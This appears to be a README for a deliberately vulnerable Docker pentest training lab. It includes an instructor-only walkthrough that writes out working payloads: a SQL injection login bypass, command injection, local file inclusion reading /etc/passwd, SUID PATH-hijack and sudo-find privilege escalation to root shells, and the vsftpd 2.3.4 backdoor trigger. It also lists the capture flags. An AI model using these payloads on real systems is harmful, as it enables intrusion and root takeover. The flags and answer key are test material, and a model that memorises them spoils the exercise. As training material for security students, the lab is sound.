# DEMO Lab — single-container pentest exercise

> **Authorized training use only.** Vulnerable by design. Binds to `127.0.0.1`
> only. Do not expose to any untrusted network.

One Docker container running two services. The student chains:
anonymous FTP recon → web SQLi login bypass → command injection (foothold as
`www-data`) → privilege escalation → `root` → flag in `/root/flag.txt`.

Extra teaching paths for the class: a **Local File Inclusion** in the
diagnostics page, and an **alternate privesc** via `sudo find` (GTFOBins)
besides the SUID PATH hijack.

## Services
| Port | Service | Role |
|------|---------|------|
| 21 (+21000-21010 passive) | FTP "vsftpd 2.3.4", anonymous | recon / hint **+ 2.3.4 backdoor** |
| 6200 | (opens on backdoor trigger) | unauthenticated **root** shell |
| 80 | Apache + PHP + SQLite | SQLi login bypass → command injection (RCE) + LFI |

## Run
Prefer the top-level launcher (`../lab.sh` / `../lab.ps1`) which starts this lab
together with the exam and prints the ports. Standalone:
```bash
docker compose up -d --build
docker compose port lab 80     # web  -> 127.0.0.1:<random port>
docker compose port lab 21     # ftp  -> 127.0.0.1:<random port>
```
Ports are published to **random free host ports on `127.0.0.1`** so they never
collide. Passive FTP data ports stay fixed at **21000-21010**.

Reset between students (removes container **and** network, state is ephemeral):
```bash
docker compose down && docker compose up -d --build
```

## Intended solution (instructor only)
1. **Recon FTP** — on Linux the target is a host at `172.30.0.10`
   (`nmap -sV 172.30.0.10`; the banner advertises `vsftpd 2.3.4`). `ftp 172.30.0.10`
   (or `ftp 127.0.0.1 <port>` on Win/Mac), log in `anonymous`, read `notes.txt`.
   Points at the web tool and mentions a root `backup` job.
2. **SQLi login bypass** — the diagnostics tool is gated behind a login at
   `http://127.0.0.1:<port>/login.php`. The query concatenates input directly:
   ```
   username: admin'--
   password: (anything)
   ```
   or `' OR '1'='1'-- `. On success the session is set and you reach `index.php`.
3. **Foothold (command injection)** — behind the login,
   `index.php?host=127.0.0.1;id`. Unsanitized input → `system()`. Land as
   `www-data`. User flag: `/var/www/user.txt`.
4. **LFI (side-path, demo only)** — the `Help` link loads pages with
   `include($_GET['page'])`. `index.php?page=/etc/passwd` reads arbitrary files;
   the help page itself hints at the `sudo` privesc.
5. **Privesc — two ways to root:**
   - **SUID PATH hijack** — `find / -perm -4000 2>/dev/null` → `/usr/local/bin/backup`
     calls `tar` with no absolute path:
     ```bash
     cd /tmp
     echo -e '#!/bin/bash\n/bin/bash -p' > tar && chmod +x tar
     PATH=/tmp:$PATH /usr/local/bin/backup
     ```
   - **sudo GTFOBins** — `sudo -l` shows `www-data` may run `find` as root:
     ```bash
     sudo find . -exec /bin/sh \; -quit
     ```
   Then `cat /root/flag.txt`.

## Alternate instant root — vsftpd 2.3.4 backdoor (famous CVE)
`nmap -sV` fingerprints the FTP banner as **vsftpd 2.3.4**. That version shipped a
backdoor: a `USER` ending in `:)` opens an unauthenticated **root** shell on
tcp/6200. This short-circuits the whole chain straight to root — good for showing
how version fingerprinting → known-CVE works.

Metasploit:
```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.30.0.10      # on Win/Mac: 127.0.0.1, and set RPORT to the mapped FTP port
run
```
Manual:
```bash
# trigger over the control channel
printf 'USER evil:)\r\nPASS x\r\n' | nc 172.30.0.10 21
# catch the root shell
nc 172.30.0.10 6200
id   # uid=0(root)
```

## Flags
- user: `FLAG{foothold_as_www_data_via_command_injection}`
- root: `FLAG{r00t_via_suid_path_hijack_gg}`
